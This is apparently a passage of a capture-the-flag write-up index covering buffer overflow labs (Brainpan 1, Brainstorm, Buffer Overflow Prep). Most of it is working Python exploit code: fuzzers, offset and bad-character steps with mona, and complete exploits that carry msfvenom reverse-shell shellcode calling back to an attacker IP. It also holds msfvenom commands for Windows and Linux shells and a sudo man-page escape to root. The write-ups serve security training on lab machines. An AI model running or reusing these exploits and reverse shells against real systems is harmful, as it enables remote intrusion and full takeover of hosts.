(\n\"\\xdb\\xdc\\xd9\\x74\\x24\\xf4\\xba\\xc7\\x11\\x57\\x7f\\x5e\\x29\\xc9\\xb1\"\n\"\\x52\\x31\\x56\\x17\\x83\\xc6\\x04\\x03\\x91\\x02\\xb5\\x8a\\xe1\\xcd\\xbb\"\n\"\\x75\\x19\\x0e\\xdc\\xfc\\xfc\\x3f\\xdc\\x9b\\x75\\x6f\\xec\\xe8\\xdb\\x9c\"\n\"\\x87\\xbd\\xcf\\x17\\xe5\\x69\\xe0\\x90\\x40\\x4c\\xcf\\x21\\xf8\\xac\\x4e\"\n\"\\xa2\\x03\\xe1\\xb0\\x9b\\xcb\\xf4\\xb1\\xdc\\x36\\xf4\\xe3\\xb5\\x3d\\xab\"\n\"\\x13\\xb1\\x08\\x70\\x98\\x89\\x9d\\xf0\\x7d\\x59\\x9f\\xd1\\xd0\\xd1\\xc6\"\n\"\\xf1\\xd3\\x36\\x73\\xb8\\xcb\\x5b\\xbe\\x72\\x60\\xaf\\x34\\x85\\xa0\\xe1\"\n\"\\xb5\\x2a\\x8d\\xcd\\x47\\x32\\xca\\xea\\xb7\\x41\\x22\\x09\\x45\\x52\\xf1\"\n\"\\x73\\x91\\xd7\\xe1\\xd4\\x52\\x4f\\xcd\\xe5\\xb7\\x16\\x86\\xea\\x7c\\x5c\"\n\"\\xc0\\xee\\x83\\xb1\\x7b\\x0a\\x0f\\x34\\xab\\x9a\\x4b\\x13\\x6f\\xc6\\x08\"\n\"\\x3a\\x36\\xa2\\xff\\x43\\x28\\x0d\\x5f\\xe6\\x23\\xa0\\xb4\\x9b\\x6e\\xad\"\n\"\\x79\\x96\\x90\\x2d\\x16\\xa1\\xe3\\x1f\\xb9\\x19\\x6b\\x2c\\x32\\x84\\x6c\"\n\"\\x53\\x69\\x70\\xe2\\xaa\\x92\\x81\\x2b\\x69\\xc6\\xd1\\x43\\x58\\x67\\xba\"\n\"\\x93\\x65\\xb2\\x6d\\xc3\\xc9\\x6d\\xce\\xb3\\xa9\\xdd\\xa6\\xd9\\x25\\x01\"\n\"\\xd6\\xe2\\xef\\x2a\\x7d\\x19\\x78\\x5f\\x93\\x25\\xa8\\x37\\x91\\x25\\x6b\"\n\"\\xe1\\x1c\\xc3\\x01\\xe1\\x48\\x5c\\xbe\\x98\\xd0\\x16\\x5f\\x64\\xcf\\x53\"\n\"\\x5f\\xee\\xfc\\xa4\\x2e\\x07\\x88\\xb6\\xc7\\xe7\\xc7\\xe4\\x4e\\xf7\\xfd\"\n\"\\x80\\x0d\\x6a\\x9a\\x50\\x5b\\x97\\x35\\x07\\x0c\\x69\\x4c\\xcd\\xa0\\xd0\"\n\"\\xe6\\xf3\\x38\\x84\\xc1\\xb7\\xe6\\x75\\xcf\\x36\\x6a\\xc1\\xeb\\x28\\xb2\"\n\"\\xca\\xb7\\x1c\\x6a\\x9d\\x61\\xca\\xcc\\x77\\xc0\\xa4\\x86\\x24\\x8a\\x20\"\n\"\\x5e\\x07\\x0d\\x36\\x5f\\x42\\xfb\\xd6\\xee\\x3b\\xba\\xe9\\xdf\\xab\\x4a\"\n\"\\x92\\x3d\\x4c\\xb4\\x49\\x86\\x6c\\x57\\x5b\\xf3\\x04\\xce\\x0e\\xbe\\x48\"\n\"\\xf1\\xe5\\xfd\\x74\\x72\\x0f\\x7e\\x83\\x6a\\x7a\\x7b\\xcf\\x2c\\x97\\xf1\"\n\"\\x40\\xd9\\x97\\xa6\\x61\\xc8\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Brainpan%201/04-user/","title":"04 user","text":"<p>we are in a linux box via the brainpan binary running via wine</p> <p></p> <p>now lets get the linux shell and use <code>x86</code> architecture </p> <p><code>msfvenom -p  linux/x86/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -b \"\\x00\"</code></p> <p>replace it with the windows shell code</p> <p></p>"},{"location":"Brainpan%201/05-root/","title":"05 root","text":"<p><code>sudo -l</code></p> <p></p> <p>we can access the man pages  </p> <p>and doing <code>!/bin/bash</code> drops the shell with root privileges</p> <p></p> <p></p>"},{"location":"Brainstorm/01-overview/","title":"01 overview","text":"<p>3 open ports ftp  rdp and 9999 </p> <p></p>"},{"location":"Brainstorm/01-overview/#set-the-ftp-in-binary-mode-and-then-mget","title":"set the ftp in binary mode and then mget","text":"<p>otherwise the binary will become corrupt</p> <p></p> <p>ftp have binary and a dll</p> <p></p> <p>and port 9999 is a binary usage </p> <p>from where we have over flow the binary.</p>"},{"location":"Brainstorm/02-bof/","title":"02 bof","text":"<p>Running the binary locally </p> <p></p> <p>here on analysing the binary it does not crash when we fuzz the username but the message</p> <p></p> <p>## fuzzing  so the fuzzing script</p> <p>```python  #!/usr/bin/env python3</p> <p>import socket, time, sys</p> <p>ip = \"192.168.1.102\"</p> <p>port = 9999 timeout = 5 prefix = \"\"</p> <p>string = prefix + \"A\" * 100</p> <p>while True:   try:     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:       s.settimeout(timeout)       s.connect((ip, port))       s.recv(1024)       s.send(bytes(\"sp00f \", \"latin-1\"))       s.recv(1024)       print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))       s.send(bytes(string, \"latin-1\"))       s.recv(1024)   except:     print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))     sys.exit(0)   string += 100 * \"A\"   time.sleep(1)  ```</p> <p>and it crashed at 3000 bytes  </p> <p>## offset</p> <p></p> <p>EIP: 31704330</p> <p></p> <p>offset: 2012</p> <p>after many attempts it became clear that we have to crash to program to see the updated EIP(dont know why, so have to send the rest of the bytes along with the buffer too)</p> <p></p> <pre><code>import socket\n\nip = \"192.168.1.102\"\nport = 9999\n\nprefix = \"\"\noffset = 2012\noverflow = \"A\" * offset + \"B\"*4\nretn = \"\"\npadding = \"\"\npayload = \"\"\npostfix = \"C\"*984\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  s.recv(1024)\n  #s.recv(1024)\n  s.send(bytes(\"sp00f\" + \"\\r\\n\", \"latin-1\"))\n  s.recv(1024)\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Brainstorm/02-bof/#bad-chars","title":"bad chars","text":"<p><code>!mona config -set workingfolder C:\\mona\\%p</code></p> <p><code>!mona bytearray -b \"\\x00\"</code></p> <p>ESP: 01E4EEF0</p> <p><code>!mona compare -f C:\\mona\\bytearray.bin -a 01E4EEF0</code></p> <p>or <code>!mona compare -f C:\\mona\\bytearray.bin -a esp</code></p> <p>here the only bad char is <code>\\x00</code></p> <p></p>"},{"location":"Brainstorm/02-bof/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -epb \"\\x00\"</code></p> <p>625014DF</p> <p>little endian <code>\\xdf\\x14\\x50\\x62</code></p> <p></p>"},{"location":"Brainstorm/02-bof/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\"</code> we got shell</p> <p></p> <p>root(the only flag) === 5b1001de5a44eca47eee71e7942a8f8a </p> <p></p> <pre><code>import socket\n\nip = \"10.10.21.198\"\nport = 9999\n\nprefix = \"\"\noffset = 2012\noverflow = \"A\" * offset\nretn = \"\\xdf\\x14\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xfc\\xbb\\x94\\xfa\\x8d\\xa0\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\"\n\"\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x68\\x12\\x0f\\xa0\\x90\"\n\"\\xe3\\x70\\x28\\x75\\xd2\\xb0\\x4e\\xfe\\x45\\x01\\x04\\x52\\x6a\\xea\\x48\"\n\"\\x46\\xf9\\x9e\\x44\\x69\\x4a\\x14\\xb3\\x44\\x4b\\x05\\x87\\xc7\\xcf\\x54\"\n\"\\xd4\\x27\\xf1\\x96\\x29\\x26\\x36\\xca\\xc0\\x7a\\xef\\x80\\x77\\x6a\\x84\"\n\"\\xdd\\x4b\\x01\\xd6\\xf0\\xcb\\xf6\\xaf\\xf3\\xfa\\xa9\\xa4\\xad\\xdc\\x48\"\n\"\\x68\\xc6\\x54\\x52\\x6d\\xe3\\x2f\\xe9\\x45\\x9f\\xb1\\x3b\\x94\\x60\\x1d\"\n\"\\x02\\x18\\x93\\x5f\\x43\\x9f\\x4c\\x2a\\xbd\\xe3\\xf1\\x2d\\x7a\\x99\\x2d\"\n\"\\xbb\\x98\\x39\\xa5\\x1b\\x44\\xbb\\x6a\\xfd\\x0f\\xb7\\xc7\\x89\\x57\\xd4\"\n\"\\xd6\\x5e\\xec\\xe0\\x53\\x61\\x22\\x61\\x27\\x46\\xe6\\x29\\xf3\\xe7\\xbf\"\n\"\\x97\\x52\\x17\\xdf\\x77\\x0a\\xbd\\x94\\x9a\\x5f\\xcc\\xf7\\xf2\\xac\\xfd\"\n\"\\x07\\x03\\xbb\\x76\\x74\\x31\\x64\\x2d\\x12\\x79\\xed\\xeb\\xe5\\x7e\\xc4\"\n\"\\x4c\\x79\\x81\\xe7\\xac\\x50\\x46\\xb3\\xfc\\xca\\x6f\\xbc\\x96\\x0a\\x8f\"\n\"\\x69\\x38\\x5a\\x3f\\xc2\\xf9\\x0a\\xff\\xb2\\x91\\x40\\xf0\\xed\\x82\\x6b\"\n\"\\xda\\x85\\x29\\x96\\x8d\\xa3\\xbc\\x9c\\x9d\\xdc\\xbc\\x9c\\x3e\\x34\\x48\"\n\"\\x7a\\x2a\\x56\\x1c\\xd5\\xc3\\xcf\\x05\\xad\\x72\\x0f\\x90\\xc8\\xb5\\x9b\"\n\"\\x17\\x2d\\x7b\\x6c\\x5d\\x3d\\xec\\x9c\\x28\\x1f\\xbb\\xa3\\x86\\x37\\x27\"\n\"\\x31\\x4d\\xc7\\x2e\\x2a\\xda\\x90\\x67\\x9c\\x13\\x74\\x9a\\x87\\x8d\\x6a\"\n\"\\x67\\x51\\xf5\\x2e\\xbc\\xa2\\xf8\\xaf\\x31\\x9e\\xde\\xbf\\x8f\\x1f\\x5b\"\n\"\\xeb\\x5f\\x76\\x35\\x45\\x26\\x20\\xf7\\x3f\\xf0\\x9f\\x51\\xd7\\x85\\xd3\"\n\"\\x61\\xa1\\x89\\x39\\x14\\x4d\\x3b\\x94\\x61\\x72\\xf4\\x70\\x66\\x0b\\xe8\"\n\"\\xe0\\x89\\xc6\\xa8\\x01\\x68\\xc2\\xc4\\xa9\\x35\\x87\\x64\\xb4\\xc5\\x72\"\n\"\\xaa\\xc1\\x45\\x76\\x53\\x36\\x55\\xf3\\x56\\x72\\xd1\\xe8\\x2a\\xeb\\xb4\"\n\"\\x0e\\x98\\x0c\\x9d\\x0e\\x1e\\xf3\\x1e\"\n)\n\npostfix = \"C\"*984\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  s.recv(1024)\n  #s.recv(1024)\n  s.send(bytes(\"sp00f\" + \"\\r\\n\", \"latin-1\"))\n  s.recv(1024)\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-1/","title":"Binary 1","text":""},{"location":"Buffer%20Overflow%20Prep/binary-1/#mona-config","title":"mona config","text":"<pre><code>!mona config -set workingfolder c:\\mona\\%p\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-1/#fuzzing","title":"fuzzing","text":"<pre><code>#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"10.10.215.21\"\n\nport = 1337\ntimeout = 5\nprefix = \"OVERFLOW1 \"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string, \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-1/#pattern","title":"pattern","text":"<p>0x6f43396e</p> <p></p> <p><code>!mona findmsp -distance 2000</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.215.21\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 0\noverflow = \"A\" * offset\nretn = \"\"\npadding = \"\"\npayload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-1/#offset","title":"offset","text":"<pre><code>import socket\n\nip = \"10.10.215.21\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 1978\noverflow = \"A\" * offset + \"B\"*4\nretn = \"\"\npadding = \"\"\npayload = \"\"\n#payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co\"\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-1/#bad-chars","title":"bad chars","text":"<p>create bad chars</p> <p><code>!mona bytearray -b \"\\x00\"</code></p> <p>run and  find the bad chars</p> <p><code>!mona compare -f C:\\mona\\oscp\\bytearray.bin -a (ESP-add)</code>  bad chars exclude the next char after the every one except <code>\\x00</code> <code>\\x00\\x07\\x2e\\xa0</code></p> <pre><code>import socket\n\nip = \"10.10.215.21\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 1978\noverflow = \"A\" * offset + \"B\"*4\nretn = \"\"\npadding = \"\"\npayload = \"\"\n#payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3C